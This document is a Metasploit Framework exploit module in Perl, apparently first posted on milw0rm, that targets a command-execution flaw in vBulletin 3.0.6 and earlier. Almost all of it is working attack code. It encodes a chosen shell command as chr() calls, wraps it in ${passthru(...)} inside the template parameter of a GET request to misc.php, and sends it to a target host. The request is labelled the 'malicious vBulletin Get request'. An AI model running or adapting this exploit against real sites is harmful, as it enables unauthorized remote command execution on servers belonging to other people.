vBulletin <= 3.0.6 (Template) Command Execution Exploit (metasploit)
====================================================================




##
#        Title: vBulletin <= 3.0.6 (Add Template Name in HTML Comments = Yes) command execution eXploit
#    Name: php_vb3_0_6.pm
# License: Artistic/BSD/GPL
#         Info: trying to get the command execution exploits out of the way on milw0rm.com. M&#039;s are always good.
#
#
#  - This is an exploit module for the Metasploit Framework, please see
#     http://metasploit.com/projects/Framework for more information.
##

package Msf::Exploit::php_vb3_0_6;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
        &#039;Name&#039;     => &#039;vBulletin <= 3.0.6 (Add Template Name in HTML Comments = Yes) command execution eXploit&#039;,
        &#039;Version&#039;  => &#039;$Revision: 1.0 $&#039;,
        &#039;Authors&#039;  => [ &#039;str0ke&#039; ],
        &#039;Arch&#039;     => [ ],
        &#039;OS&#039;       => [ ],
        &#039;Priv&#039;     => 0,
        &#039;UserOpts&#039; =>
          {
                &#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
                &#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
                &#039;VHOST&#039; => [0, &#039;DATA&#039;, &#039;The virtual host name of the server&#039;],
                &#039;RPATH&#039; => [1, &#039;DATA&#039;, &#039;Path to the misc.php script&#039;, &#039;/forum/misc.php&#039;],
                &#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
          },

        &#039;Description&#039; => Pex::Text::Freeform(qq{
                This module exploits a code execution flaw in vBulletin <= 3.0.6.
}),

        &#039;Refs&#039; =>
          [
                [&#039;MIL&#039;, &#039;832&#039;],
          ],

        &#039;Payload&#039; =>
          {
                &#039;Space&#039; => 512,
                &#039;Keys&#039;  => [&#039;cmd&#039;, &#039;cmd_bash&#039;],
          },

        &#039;Keys&#039; => [&#039;vBulletin&#039;],
  };

sub new {
        my $class = shift;
        my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
        return($self);
}

sub Exploit {
        my $self = shift;
        my $target_host    = $self->GetVar(&#039;RHOST&#039;);
        my $target_port    = $self->GetVar(&#039;RPORT&#039;);
        my $vhost          = $self->GetVar(&#039;VHOST&#039;) || $target_host;
        my $path           = $self->GetVar(&#039;RPATH&#039;);
        my $cmd            = $self->GetVar(&#039;EncodedPayload&#039;)->RawPayload;

        # Encode the command as a set of chr() function calls
        my $byte = join(&#039;.&#039;, map { $_ = &#039;chr(&#039;.$_.&#039;)&#039; } unpack(&#039;C*&#039;, $cmd));

        # Create the get request data
        my $data = "?do=page&template={\${passthru($byte)}}";

        my $req =
                "GET $path$data HTTP/1.1\r\n".
                "Host: $vhost:$target_port\r\n".
                "Content-Type: application/html\r\n".
                "Content-Length: ". length($data)."\r\n".
                "Connection: Close\r\n".
                "\r\n";

        my $s = Msf::Socket::Tcp->new(
                &#039;PeerAddr&#039;  => $target_host,
                &#039;PeerPort&#039;  => $target_port,
                &#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
                &#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
          );

        if ($s->IsError){
                $self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
                return;
        }

        $self->PrintLine("[*] Sending the malicious vBulletin Get request...");

        $s->Send($req);

        my $results = $s->Recv(-1, 20);
        $s->Close();

        return;
}

1;



